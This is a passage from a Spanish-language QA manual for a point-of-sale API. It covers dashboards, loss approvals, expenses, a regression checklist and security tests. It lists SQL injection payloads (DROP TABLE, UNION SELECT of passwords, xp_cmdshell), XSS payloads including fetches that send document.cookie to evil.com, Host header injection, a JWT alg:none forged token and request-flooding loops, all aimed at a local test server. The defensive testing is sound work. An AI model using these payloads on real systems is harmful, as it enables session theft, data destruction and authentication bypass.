  -H "Authorization: Bearer $TOKEN" \
  -d '{"employee_code": "EMP-COM", "name": "Test", "position": "cajero", "commission_rate": 5.0}'

# Position invalida
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"employee_code": "EMP-POS", "name": "Test", "position": "hacker"}'

# XSS en nombre de empleado
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"employee_code": "EMP-XSS", "name": "<script>alert(1)</script>", "position": "cajero"}'
```

**Sincronizacion - abuso:**

```bash
# Llamar sync 50 veces en rapida sucesion (DoS)
for i in $(seq 1 50); do
  curl -s http://localhost:8000/api/v1/sync/products \
    -H "Authorization: Bearer $TOKEN" &
done
wait
# Debe haber rate limiting, no debe saturar la BD

# Push datos malformados
curl -X POST http://localhost:8000/api/v1/sync/products \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"malformed": true, "not_a_product": "definitely"}'
```

---

## 11. Modulo Estadisticas (F9)

### 11.1 Dashboard Rapido

**Endpoint:** `GET /api/v1/dashboard/quick`

```bash
curl http://localhost:8000/api/v1/dashboard/quick \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "ventas_hoy": 23,
    "total_hoy": 15680.50,
    "mermas_pendientes": 2,
    "timestamp": "2026-02-24T12:00:00+00:00"
  }
}
```

### 11.2 Dashboard RESICO (Fiscal)

**Endpoint:** `GET /api/v1/dashboard/resico`

```bash
curl http://localhost:8000/api/v1/dashboard/resico \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "serie_a": 1250000.0,
    "serie_b": 350000.0,
    "total": 1600000.0,
    "limite_resico": 3500000.0,
    "restante": 2250000.0,
    "porcentaje": 35.71,
    "proyeccion_anual": 2800000.0,
    "status": "GREEN",
    "dias_restantes": 310
  }
}
```

**Semaforo RESICO:**
- `GREEN`: < 70% del limite ($3,500,000 MXN)
- `YELLOW`: 70-90% del limite
- `RED`: > 90% del limite

### 11.3 Dashboard de Gastos

**Endpoint:** `GET /api/v1/dashboard/expenses`

```bash
curl http://localhost:8000/api/v1/dashboard/expenses \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "month": 12500.0,
    "year": 85000.0
  }
}
```

### 11.4 Dashboard de Riqueza

**Endpoint:** `GET /api/v1/dashboard/wealth`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl http://localhost:8000/api/v1/dashboard/wealth \
  -H "Authorization: Bearer $TOKEN"
```

### 11.5 Dashboard de IA (Alertas Inteligentes)

**Endpoint:** `GET /api/v1/dashboard/ai`

```bash
curl http://localhost:8000/api/v1/dashboard/ai \
  -H "Authorization: Bearer $TOKEN"
```

**Incluye:**
- Predicciones de desabasto (stockout)
- Productos mas vendidos con tendencias
- Anomalias detectadas

### 11.6 Dashboard Ejecutivo

**Endpoint:** `GET /api/v1/dashboard/executive`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl http://localhost:8000/api/v1/dashboard/executive \
  -H "Authorization: Bearer $TOKEN"
```

### 11.7 Prueba en Frontend

1. Presionar **F9** para ir a estadisticas
2. Verificar que el widget de ventas del dia muestra datos correctos
3. Revisar el semaforo RESICO (debe coincidir con las ventas acumuladas)
4. Verificar los gastos del mes y del anio
5. Revisar las alertas de stock inteligentes
6. Si se tiene rol gerente+, verificar el dashboard de riqueza y ejecutivo

### 11.8 Pruebas Destructivas (Intentar Romper)

**RBAC bypass en dashboards restringidos:**

```bash
# Cajero intenta acceder a dashboard de riqueza
curl http://localhost:8000/api/v1/dashboard/wealth \
  -H "Authorization: Bearer $TOKEN_CAJERO"
# Debe retornar 403

# Cajero intenta acceder a dashboard ejecutivo
curl http://localhost:8000/api/v1/dashboard/executive \
  -H "Authorization: Bearer $TOKEN_CAJERO"
# Debe retornar 403
```

**Sin autenticacion:**

```bash
# Todos los dashboards sin token
curl http://localhost:8000/api/v1/dashboard/quick
curl http://localhost:8000/api/v1/dashboard/resico
curl http://localhost:8000/api/v1/dashboard/wealth
curl http://localhost:8000/api/v1/dashboard/ai
curl http://localhost:8000/api/v1/dashboard/executive
# Todos deben retornar 401
```

**Headers maliciosos:**

```bash
# Header injection
curl http://localhost:8000/api/v1/dashboard/quick \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1"

# Host header injection
curl http://localhost:8000/api/v1/dashboard/quick \
  -H "Authorization: Bearer $TOKEN" \
  -H "Host: evil.com"
```

**Carga en endpoints de IA:**

```bash
# Llamar AI dashboard 100 veces rapido (puede ser costoso)
for i in $(seq 1 100); do
  curl -s http://localhost:8000/api/v1/dashboard/ai \
    -H "Authorization: Bearer $TOKEN" &
done
wait
# No debe causar timeout o crash del servidor
```

---

## 12. Modulo Mermas (F10)

### 12.1 Ver Mermas Pendientes

**Endpoint:** `GET /api/v1/mermas/pending`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl http://localhost:8000/api/v1/mermas/pending \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "count": 2,
    "mermas": [
      {
        "id": 1,
        "product": "Shampoo 400ml",
        "sku": "SHAM-001",
        "quantity": 3.0,
        "unit_cost": 45.0,
        "total_value": 135.0,
        "loss_type": "damage",
        "reason": "Botellas rotas en almacen",
        "category": "Higiene",
        "has_photo": true,
        "witness": "Pedro Lopez",
        "created_at": "2026-02-24T08:30:00"
      }
    ]
  }
}
```

### 12.2 Aprobar una Merma

**Endpoint:** `POST /api/v1/mermas/approve`

```bash
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "merma_id": 1,
    "approved": true,
    "notes": "Verificado en bodega - producto danado"
  }'
```

**Respuesta esperada:**

```json
{"success": true, "data": {"status": "approved"}}
```

### 12.3 Rechazar una Merma

```bash
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "merma_id": 2,
    "approved": false,
    "notes": "El producto no presenta dano visible"
  }'
```

**Respuesta esperada:**

```json
{"success": true, "data": {"status": "rejected"}}
```

**Verificaciones:**
- Usa `FOR UPDATE` para evitar aprobacion doble (TOCTOU)
- Solo mermas con status `pending` pueden ser aprobadas/rechazadas
- Mermas ya procesadas retornan error 400

### 12.4 Prueba en Frontend

1. Presionar **F10** para ir al modulo de mermas
2. Ver la lista de mermas pendientes de aprobacion
3. Revisar los detalles de cada merma (producto, cantidad, razon, testigo)
4. Aprobar una merma con notas justificativas
5. Rechazar una merma
6. Verificar que la merma procesada ya no aparece en pendientes
7. Intentar aprobar una merma ya procesada (debe mostrar error)

### 12.5 Pruebas Destructivas (Intentar Romper)

**Aprobacion doble (TOCTOU):**

```bash
# Dos aprobaciones simultaneas de la misma merma
curl -s -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 1, "approved": true, "notes": "Aprobado A"}' &
curl -s -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 1, "approved": true, "notes": "Aprobado B"}' &
wait
# Solo UNA debe tener exito, la otra debe retornar error
# El stock solo debe ajustarse UNA vez
```

**Merma con ID invalido:**

```bash
# ID inexistente
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 99999, "approved": true, "notes": "Test"}'

# ID negativo
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": -1, "approved": true, "notes": "Test"}'

# ID como string
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": "abc", "approved": true, "notes": "Test"}'
```

**Aprobar y rechazar al mismo tiempo:**

```bash
curl -s -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 1, "approved": true, "notes": "Si"}' &
curl -s -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 1, "approved": false, "notes": "No"}' &
wait
# Solo una operacion debe tener exito
```

**XSS en notas de aprobacion:**

```bash
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"merma_id": 1, "approved": true, "notes": "<script>fetch(\"http://evil.com/steal?cookie=\"+document.cookie)</script>"}'
```

**Cajero intenta aprobar merma:**

```bash
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"merma_id": 1, "approved": true, "notes": "Bypass intento"}'
# Debe retornar 403
```

---

## 13. Modulo Gastos (F11)

### 13.1 Registrar un Gasto

**Endpoint:** `POST /api/v1/expenses/`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

```bash
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "amount": 350.00,
    "description": "Compra de material de limpieza",
    "reason": "Limpieza quincenal de tienda"
  }'
```

**Respuesta esperada:**

```json
{"success": true, "data": {"id": 8}}
```

**Notas:**
- El gasto se vincula automaticamente al turno abierto del usuario (si existe)
- Se registra como un `cash_movement` de tipo `expense`
- `amount` debe ser > 0

### 13.2 Ver Resumen de Gastos

**Endpoint:** `GET /api/v1/expenses/summary`

```bash
curl http://localhost:8000/api/v1/expenses/summary \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "month": 4500.0,
    "year": 32000.0
  }
}
```

### 13.3 Prueba en Frontend

1. Presionar **F11** para ir al modulo de gastos
2. Registrar un gasto con descripcion y monto
3. Verificar que aparece en el resumen del mes
4. Verificar que el gasto afecta el resumen del turno actual
5. Intentar registrar un gasto con rol de cajero (debe rechazar)

### 13.4 Pruebas Destructivas (Intentar Romper)

**Montos invalidos:**

```bash
# Monto cero
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0, "description": "Gasto de cero"}'

# Monto negativo (ingreso disfrazado de gasto?)
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": -500, "description": "Monto negativo"}'

# Monto astronomico
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 99999999999.99, "description": "Monto absurdo"}'

# Monto como string
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": "trescientos", "description": "String test"}'

# Monto con muchos decimales
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0.00001, "description": "Decimales extremos"}'
```

**XSS y SQL injection en descripcion:**

```bash
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 100, "description": "<script>alert(document.cookie)</script>"}'

curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 100, "description": "'; DROP TABLE expenses;--"}'

curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 100, "reason": "<img src=x onerror=alert(1)>"}'
```

**Gasto sin turno abierto:**

```bash
# Cerrar turno primero, luego intentar registrar gasto
# Verificar: debe funcionar sin turno? O debe rechazar?
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 100, "description": "Gasto sin turno"}'
```

**Spam de gastos (rapido):**

```bash
# 50 gastos en 1 segundo
for i in $(seq 1 50); do
  curl -s -X POST http://localhost:8000/api/v1/expenses/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"amount": 1, "description": "Spam test '$i'"}' &
done
wait
# Verificar: resumen debe sumar exactamente $50
```

**RBAC: cajero intenta registrar gasto:**

```bash
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"amount": 100, "description": "Intento cajero"}'
# Debe retornar 403
```

---

## 14. Como Reportar Bugs

### 14.1 Plantilla de Reporte de Bug

```
## Titulo del Bug
[Descripcion breve y descriptiva del problema]

## Severidad
[ ] CRITICAL — El sistema se cae, se pierde dinero, o la venta no se puede completar
[ ] HIGH — Funcionalidad principal no funciona, pero hay workaround
[ ] MEDIUM — Funcionalidad secundaria con problemas
[ ] LOW — Error cosmetico o de texto

## Ambiente
- Navegador/App: [Electron v1.0.0 / Chrome 121]
- Sistema Operativo: [Linux / Windows 10]
- Backend: [commit hash o version]
- Frontend: [commit hash o version]
- Fecha y hora: [2026-02-24 14:30]

## Pasos para Reproducir
1. Iniciar sesion como [rol: cajero/gerente/admin]
2. Ir a [pantalla/modulo - ejemplo: Terminal F1]
3. [Accion especifica - ejemplo: Escanear producto SKU-001]
4. [Accion siguiente - ejemplo: Cambiar cantidad a 5]
5. [Accion que causa el error]

## Resultado Esperado
[Que deberia pasar]

## Resultado Obtenido
[Que paso en realidad]

## Evidencia
- Screenshot: [adjuntar captura de pantalla]
- Logs del backend: [pegar las lineas relevantes del log]
- Console del navegador: [pegar errores de la consola F12]
- curl del endpoint: [si aplica, incluir el curl y la respuesta]

## Informacion Adicional
[Cualquier contexto extra, frecuencia del problema, datos de prueba usados]
```

### 14.2 Donde Obtener Logs

**Logs del backend:**

```bash
# Si se ejecuta directamente
# Los logs aparecen en la terminal donde se inicio uvicorn

# Si se ejecuta con Docker
docker compose logs -f api
```

**Logs del frontend (Electron):**
- Abrir DevTools con `Ctrl+Shift+I`
- Ir a la pestana "Console"
- Copiar errores en rojo

**Logs de la base de datos:**

```bash
docker compose logs -f postgres
```

### 14.3 Ejemplos de Bugs por Severidad

**CRITICAL:**
- Venta se completa pero no descuenta stock
- Se puede vender con stock negativo
- Token de autenticacion no expira nunca
- Datos de credito del cliente se corrompen

**HIGH:**
- No se puede cancelar una venta desde el frontend
- El conteo de cierre de turno no coincide con las ventas
- La busqueda por barcode no encuentra productos existentes

**MEDIUM:**
- El resumen de gastos muestra el mes anterior en vez del actual
- La paginacion de productos no funciona despues de la pagina 5
- El campo de descuento acepta valores negativos

**LOW:**
- Error de ortografia en un mensaje de error
- El boton de "Cancelar" esta desalineado
- El tooltip de un campo no se muestra correctamente

---

## 15. Checklist de Regresion

Ejecutar antes de cada release o despliegue:

### 15.1 Autenticacion

- [ ] Login con credenciales validas devuelve token
- [ ] Login con credenciales invalidas devuelve 401
- [ ] Token expirado es rechazado
- [ ] Endpoints protegidos rechazan peticiones sin token
- [ ] Verificar que `/api/v1/auth/verify` funciona
- [ ] **DESTRUCTIVO:** SQL injection en campo username (`' OR 1=1--`) retorna 401, no datos
- [ ] **DESTRUCTIVO:** Token con payload modificado manualmente es rechazado
- [ ] **DESTRUCTIVO:** 100 intentos de login fallidos activan rate limiting (429)
- [ ] **DESTRUCTIVO:** Username de 10,000 caracteres no causa crash (422 o 401)
- [ ] **DESTRUCTIVO:** Body JSON malformado retorna 422, no 500
- [ ] **DESTRUCTIVO:** Token con formato `Bearer not.a.jwt` retorna 401
- [ ] **DESTRUCTIVO:** Header `Authorization: Basic xxx` es rechazado correctamente

### 15.2 Turnos

- [ ] Se puede abrir un turno con efectivo inicial
- [ ] No se puede abrir dos turnos a la vez para el mismo usuario
- [ ] Se puede cerrar un turno con conteo de efectivo
- [ ] El calculo de efectivo esperado es correcto
- [ ] La diferencia (sobrante/faltante) se calcula bien
- [ ] **DESTRUCTIVO:** Abrir dos turnos simultaneos (race condition) - solo uno tiene exito
- [ ] **DESTRUCTIVO:** Efectivo inicial negativo es rechazado
- [ ] **DESTRUCTIVO:** Cajero B no puede cerrar turno de Cajero A (a menos que sea gerente)
- [ ] **DESTRUCTIVO:** Cerrar turno ya cerrado retorna error, no duplica cierre
- [ ] **DESTRUCTIVO:** Denominacion negativa en conteo de cierre es rechazada
- [ ] **DESTRUCTIVO:** PIN de gerente incorrecto 20 veces no bloquea el sistema entero

### 15.3 Ventas

- [ ] Se puede crear una venta con pago en efectivo
- [ ] El cambio se calcula correctamente
- [ ] Se puede crear una venta con tarjeta
- [ ] Se puede crear una venta con pago mixto
- [ ] La suma de pagos mixtos debe coincidir con el total
- [ ] Se puede crear una venta a credito (con cliente)
- [ ] No se puede vender a credito sin `customer_id`
- [ ] No se puede vender mas stock del disponible
- [ ] El stock se descuenta correctamente tras la venta
- [ ] El folio se genera secuencialmente
- [ ] Se puede cancelar una venta (solo gerente+)
- [ ] Al cancelar, el stock se restaura
- [ ] Al cancelar venta a credito, el saldo del cliente se revierte
- [ ] No se puede crear venta sin turno abierto
- [ ] **DESTRUCTIVO:** Cantidad 0 en item es rechazada
- [ ] **DESTRUCTIVO:** Cantidad -5 en item es rechazada
- [ ] **DESTRUCTIVO:** Precio negativo en item es rechazado
- [ ] **DESTRUCTIVO:** Descuento mayor que precio es rechazado
- [ ] **DESTRUCTIVO:** Metodo de pago "bitcoin" (inexistente) retorna error claro
- [ ] **DESTRUCTIVO:** Dos ventas simultaneas del mismo producto con stock=1 - solo una tiene exito
- [ ] **DESTRUCTIVO:** 10 envios rapidos de la misma venta no crean duplicados
- [ ] **DESTRUCTIVO:** product_id inexistente (99999) retorna 404, no crash
- [ ] **DESTRUCTIVO:** Lista de items vacia es rechazada
- [ ] **DESTRUCTIVO:** Cancelar venta ya cancelada retorna error, no revierte stock dos veces
- [ ] **DESTRUCTIVO:** Cajero no puede cancelar ventas (403)
- [ ] **DESTRUCTIVO:** SQL injection en busqueda de productos es inofensiva

### 15.4 Productos

- [ ] Se pueden listar productos con paginacion
- [ ] Se puede buscar por nombre, SKU y barcode
- [ ] Se puede crear un producto con todos los campos
- [ ] No se puede crear producto con SKU duplicado
- [ ] Se puede actualizar precio (solo gerente+)
- [ ] Los cambios de precio se registran en price_history
- [ ] Se puede soft-delete un producto
- [ ] El scan por barcode/SKU funciona
- [ ] **DESTRUCTIVO:** SKU con inyeccion SQL no afecta la BD
- [ ] **DESTRUCTIVO:** SKU vacio es rechazado
- [ ] **DESTRUCTIVO:** Precio negativo es rechazado
- [ ] **DESTRUCTIVO:** Precio como string ("cien") retorna 422
- [ ] **DESTRUCTIVO:** XSS en nombre de producto (`<script>`) se guarda como texto plano
- [ ] **DESTRUCTIVO:** Cajero no puede crear productos (403)
- [ ] **DESTRUCTIVO:** Stock negativo directo es rechazado
- [ ] **DESTRUCTIVO:** Barcode de 500 caracteres no causa crash

### 15.5 Clientes

- [ ] Se pueden listar clientes con busqueda
- [ ] Se puede crear un cliente
- [ ] Se puede actualizar un cliente
- [ ] Solo gerentes pueden cambiar `credit_limit`
- [ ] La informacion de credito es correcta
- [ ] El historial de compras se muestra
- [ ] **DESTRUCTIVO:** XSS en nombre de cliente se guarda como texto plano
- [ ] **DESTRUCTIVO:** SQL injection en busqueda de clientes es inofensiva
- [ ] **DESTRUCTIVO:** Credit limit negativo es rechazado
- [ ] **DESTRUCTIVO:** Email invalido (sin @) es rechazado
- [ ] **DESTRUCTIVO:** 5 ventas a credito simultaneas no exceden el limite
- [ ] **DESTRUCTIVO:** Acceso a cliente ID inexistente retorna 404, no crash

### 15.6 Inventario

- [ ] Se puede ajustar stock positivamente (entrada)
- [ ] Se puede ajustar stock negativamente (salida)
- [ ] No se permite stock resultante negativo
- [ ] Se registran movimientos de auditoria
- [ ] Las alertas de stock bajo funcionan
- [ ] **DESTRUCTIVO:** 10 ajustes simultaneos al mismo producto dan resultado correcto
- [ ] **DESTRUCTIVO:** Ajuste de cantidad 0 se maneja correctamente
- [ ] **DESTRUCTIVO:** Cantidad MAX_INT no causa overflow
- [ ] **DESTRUCTIVO:** Operacion de stock "multiply" (inexistente) es rechazada
- [ ] **DESTRUCTIVO:** SQL injection en razon de ajuste es inofensiva

### 15.7 Mermas

- [ ] Se listan mermas pendientes
- [ ] Se puede aprobar una merma
- [ ] Se puede rechazar una merma
- [ ] No se puede procesar una merma ya procesada
- [ ] **DESTRUCTIVO:** Dos aprobaciones simultaneas de la misma merma - solo una tiene exito
- [ ] **DESTRUCTIVO:** Aprobar y rechazar simultaneamente la misma merma - resultado consistente
- [ ] **DESTRUCTIVO:** Merma ID inexistente retorna error claro
- [ ] **DESTRUCTIVO:** Cajero no puede aprobar mermas (403)

### 15.8 Gastos

- [ ] Se puede registrar un gasto (solo gerente+)
- [ ] El resumen muestra totales correctos del mes y anio
- [ ] El gasto se vincula al turno abierto
- [ ] **DESTRUCTIVO:** Monto 0 es rechazado
- [ ] **DESTRUCTIVO:** Monto negativo es rechazado
- [ ] **DESTRUCTIVO:** XSS en descripcion se guarda como texto plano
- [ ] **DESTRUCTIVO:** Cajero no puede registrar gastos (403)
- [ ] **DESTRUCTIVO:** 50 gastos rapidos suman correctamente

### 15.9 Dashboards

- [ ] Dashboard rapido muestra ventas del dia
- [ ] Dashboard RESICO muestra acumulado anual
- [ ] Semaforo RESICO es correcto segun el porcentaje
- [ ] Dashboard de gastos muestra datos del periodo
- [ ] **DESTRUCTIVO:** Cajero no accede a dashboard de riqueza (403)
- [ ] **DESTRUCTIVO:** Cajero no accede a dashboard ejecutivo (403)
- [ ] **DESTRUCTIVO:** Sin token, todos los dashboards retornan 401
- [ ] **DESTRUCTIVO:** 100 llamadas rapidas al dashboard de IA no causan crash

### 15.10 Sincronizacion

- [ ] `/api/v1/sync/status` responde correctamente
- [ ] `/api/v1/sync/products` devuelve todos los productos activos
- [ ] `/api/v1/sync/customers` devuelve todos los clientes activos
- [ ] `/api/v1/sync/shifts` devuelve turnos abiertos
- [ ] **DESTRUCTIVO:** 50 syncs simultaneos no saturan la BD
- [ ] **DESTRUCTIVO:** Push con datos malformados retorna error claro, no corrompe datos

### 15.11 Frontend

- [ ] Todos los atajos F1-F11 navegan a la pantalla correcta
- [ ] Escape cierra modales abiertos
- [ ] La interfaz se ve correcta en resolucion 1366x768 y 1920x1080
- [ ] No hay errores en la consola del navegador
- [ ] El polling del header no causa errores 401 sin sesion activa
- [ ] **DESTRUCTIVO:** Pegar 10,000 caracteres en campo de busqueda no congela la UI
- [ ] **DESTRUCTIVO:** Click rapido (spam) en boton de completar venta no crea duplicados
- [ ] **DESTRUCTIVO:** Navegar con boton atras del navegador no rompe el estado
- [ ] **DESTRUCTIVO:** Abrir dos pestanas y operar simultaneamente no causa inconsistencias
- [ ] **DESTRUCTIVO:** Zoom al 200% no oculta botones criticos
- [ ] **DESTRUCTIVO:** Desconectar red mientras se procesa venta muestra error amigable

### 15.12 RBAC (Control de Acceso)

- [ ] Cajero NO puede: crear productos, cancelar ventas, ajustar inventario, aprobar mermas, registrar gastos
- [ ] Gerente SI puede: todo lo anterior
- [ ] Cajero necesita PIN de gerente para movimientos de caja
- [ ] **DESTRUCTIVO:** Cajero usa curl directo a endpoints de gerente - todos retornan 403
- [ ] **DESTRUCTIVO:** Token de cajero con payload modificado a "admin" es rechazado
- [ ] **DESTRUCTIVO:** Cajero intenta acceder a gestion de empleados - retorna 403
- [ ] **DESTRUCTIVO:** Usuario desactivado no puede hacer login ni usar token existente

---

## 16. Atajos de Teclado

| Tecla | Pantalla | Ruta Frontend |
|---|---|---|
| **F1** | Terminal de Ventas | `/terminal` |
| **F2** | Clientes | `/clientes` |
| **F3** | Productos | `/productos` |
| **F4** | Inventario | `/inventario` |
| **F5** | Turnos | `/turnos` |
| **F6** | Reportes | `/reportes` |
| **F7** | Historial de Ventas | `/historial` |
| **F8** | Configuraciones / Ajustes | `/configuraciones` |
| **F9** | Estadisticas / Dashboard | `/estadisticas` |
| **F10** | Mermas | `/mermas` |
| **F11** | Gastos / Egresos | `/gastos` |
| **Escape** | Cerrar modal activo | (global) |

**Notas sobre atajos:**
- Los atajos F1-F11 solo funcionan cuando hay una sesion activa (token almacenado)
- Los atajos se desactivan cuando hay un modal abierto o un campo de texto enfocado (depende del componente)
- En algunos navegadores, F5 puede recargar la pagina; la aplicacion Electron previene esto con `event.preventDefault()`
- F11 en algunos sistemas operativos activa pantalla completa; el frontend lo previene

---

## 17. Pruebas de Seguridad

### 17.1 SQL Injection

Probar cada uno de los siguientes payloads en TODOS los campos de busqueda y entrada de texto del sistema:

**Payloads clasicos:**

```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
" OR "1"="1"--
'; DROP TABLE users;--
'; DROP TABLE products;--
'; DROP TABLE sales;--
' UNION SELECT null,null,null--
' UNION SELECT username,password,null FROM users--
' AND 1=0 UNION SELECT null,table_name,null FROM information_schema.tables--
1; EXEC xp_cmdshell('whoami')--
' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
```

**Campos donde probar (via curl y via frontend):**

| Campo | Endpoint | Metodo |
|---|---|---|
| Busqueda de productos | `GET /api/v1/products/?search=PAYLOAD` | GET param |
| Busqueda de clientes | `GET /api/v1/customers/?search=PAYLOAD` | GET param |
| Busqueda de ventas | `GET /api/v1/sales/search?folio=PAYLOAD` | GET param |
| Scan de producto | `GET /api/v1/products/scan/PAYLOAD` | URL path |
| Busqueda SAT | `GET /api/v1/sat/search?q=PAYLOAD` | GET param (sin auth!) |
| Nombre de cliente | `POST /api/v1/customers/` body | JSON body |
| SKU de producto | `POST /api/v1/products/` body | JSON body |
| Razon de ajuste | `POST /api/v1/inventory/adjust` body | JSON body |
| Notas de turno | `POST /api/v1/turns/open` body | JSON body |
| Descripcion gasto | `POST /api/v1/expenses/` body | JSON body |

**Resultado esperado:** TODOS deben retornar errores de validacion (400/422) o tratar el payload como texto literal. NUNCA deben ejecutar SQL ni retornar datos de otras tablas. NUNCA deben causar error 500.

### 17.2 Cross-Site Scripting (XSS)

**Payloads XSS para probar en campos de texto:**

```
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'><script>alert(1)</script>
<script>fetch('http://evil.com/?c='+document.cookie)</script>
<div style="background:url('javascript:alert(1)')">
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

**Campos donde probar:**

- Nombre de producto (crear y editar)
- Nombre de cliente
- Notas de cliente
- Descripcion de producto
- Razon de ajuste de inventario
- Notas de turno
- Descripcion de gasto
- Razon de gasto
- Notas de aprobacion/rechazo de merma
- Nombre de empleado
- Notas de empleado

**Verificacion:** Despues de guardar, navegar al listado y detalle para verificar que el texto se muestra como texto plano y NO se ejecuta como HTML/JavaScript.

### 17.3 CSRF (Cross-Site Request Forgery)

```bash
# Verificar que las peticiones POST/PUT/DELETE requieren token de autenticacion valido
# No deben funcionar solo con cookies de sesion

# Crear una pagina HTML maliciosa que intente hacer una venta:
# <form action="http://localhost:8000/api/v1/sales/" method="POST">
#   <input type="hidden" name="items" value="[...]">
# </form>
# <script>document.forms[0].submit()</script>

# Como el sistema usa JWT Bearer token (no cookies), CSRF no deberia ser posible
# PERO verificar que no existen endpoints que acepten autenticacion por cookie
```

### 17.4 Manipulacion de Tokens JWT

```bash
# 1. Obtener token valido
TOKEN_VALIDO=$(curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "<TU_PASSWORD>"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. Decodificar payload (base64)
echo $TOKEN_VALIDO | cut -d. -f2 | base64 -d 2>/dev/null

# 3. Modificar payload: cambiar "role" a "admin" si era "cajero"
# Re-encodear y enviar - DEBE ser rechazado porque la firma HMAC no coincide

# 4. Token con "alg":"none" (ataque clasico)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user_id":1,"role":"admin"}
# Signature: (vacio)
FAKE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
curl http://localhost:8000/api/v1/auth/verify \
  -H "Authorization: Bearer $FAKE_TOKEN"
# DEBE retornar 401

# 5. Token firmado con otra clave secreta
# Generar JWT con jwt.io usando secret "wrong_secret"
# DEBE retornar 401

# 6. Token expirado (exp en el pasado)
# DEBE retornar 401

# 7. Token con claims extra/modificados
# Agregar "is_admin": true al payload
# DEBE ser rechazado o ignorar el claim extra
```

### 17.5 RBAC Bypass (Escalacion de Privilegios)

```bash
# Obtener token de cajero
